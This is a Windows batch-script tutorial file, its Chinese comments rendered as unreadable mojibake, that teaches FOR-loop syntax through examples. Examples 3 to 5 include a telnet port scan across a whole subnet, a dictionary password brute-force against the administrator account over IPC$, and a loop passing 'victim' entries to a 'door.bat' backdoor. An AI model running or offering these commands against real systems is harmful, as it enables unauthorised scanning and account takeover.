:: ----------------------------------------------------------------------
:: DOS�ű�ʾ��
:: @HELP��help [command]
:: @CMD: FOR IF SET ECHO GOTO PAUSE CALL START CHOICE REM @ & && || |
:: @NOTE: ������������ִ�Сд��������ͳһ��д����������Сд���С�
::  1��REM��::-ע�ͣ�@-����ʾ����; &��&&-����������ǰ�߲�������ִ�������
::  2���������ɷ�Ϊ�����������Զ��������ѭ�����������������ӳ���չSETLocal��EndLocal
::  2.1)��������������������Ԥ���廷���������Զ��廷�����������Զ����������������������%variable%���Զ���������ñ����ӳٺ󣬿�����!variable!��
::  2.2)ѭ��������FORѭ���������������ļ�ʹ��%%variable��������ʹ��%variabl; ������Ϊ������ĸa-z��A-Z����48����
::  2.3)���������������д��������������Ϊ%1~9
::	2.4)������ǿ���� �Զ����������ǿ��չ���ɽ����ַ����滻%v:?=?%���ַ�����ȡ%v:?,?%���ַ����ϲ���ѭ���Ͳ��������ı�����չʹ��%~
::  3) ��������
:: 	@@FOR: For {%variable|%%variable} in (set) do command [ CommandLineOptions] 
::	(set)ָ��һ����һ���ļ�; �ڲ���/Fʱset�������ַ������ļ������������
::	FOR /D Ŀ¼;  FOR /R Ŀ¼��;  FOR /L ��������; FOR /F ������������
::  @@IF: IF "����"=="�ַ���";  IF EXIST �ļ�����IF ERRORLEVEL / if not errorlevel ����
::  4) ·���ǿո�ʹ������Ȧ��
:: @REFER: help FOR, http://www.jb51.net/article/52744.htm
::
:: This is a free shell script under GNU GPL version 2.0 or above
:: Copyright (C) 2006 Denny
:: ----------------------------------------------------------------------
@ECHO OFF
:: ������չ
SETlocal enabledelayedexpansion

1)�����ɾ��ĳ��Ŀ¼��(������Ŀ¼)��ָ���ļ�
���del d:\_desktop.ini /f/s/q/a
��;��ɾ������d�����ļ���Ϊ_desktop.ini���ļ�
ʹ�÷�Χ������ɾ����没�������

2)��ָ���ļ�������ĳ��Ŀ¼��(������Ŀ¼) FOR /R
���FOR /R d:\test %i IN (.) DO copy c:\root.ini %i /Y 
��;����boot.int�ļ�������d: est�����е���Ŀ¼�ͱ�Ŀ¼
ʹ�÷�Χ�� ����Ц�����

3)ɨ��һ�����ε�ȫ���˿�: FOR /L
��;��ɨ��192.168.0.x�ε�ȫ��1��65535�ο� 
ʹ�÷�Χ���˿�ɨ�裬������Ҫ����
���
FOR /L %a in (1,1,254) DO (
 FOR /L %b in (1,1,65535) DO start /low /min telnet 192.168.0.%a %b 
)

4)����������������
FOR /f %%i in (dict.txt) DO net use /ipipc$ "%%i" /u:"administrator" |find ":����ɹ����">>D:ok.txt

5)���ļ��л�ȡ���������ⲿ���������
��������ʾ��˳��victim.txt�е����ݴ��ݸ�door.bat�еĲ���%i %j %k��
@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k

6) ͳ�Ʊ�Ŀ¼��һ��Ŀ¼���ļ���Ŀ FOR /D
:: list file and num, the same to "find | wc -l"
:: add by Denny, 2015-2-16
SET filename=dirfiles.txt
cd. > %filename%
ECHO "filename	num" >> %filename%	

FOR /d %%a  in (*.*) DO (
SET n=0
FOR /f %%B in ('dir /a-d /b /s "%%a"') DO SET /a n+=1
ECHO %%a    !n! >> %filename%
)


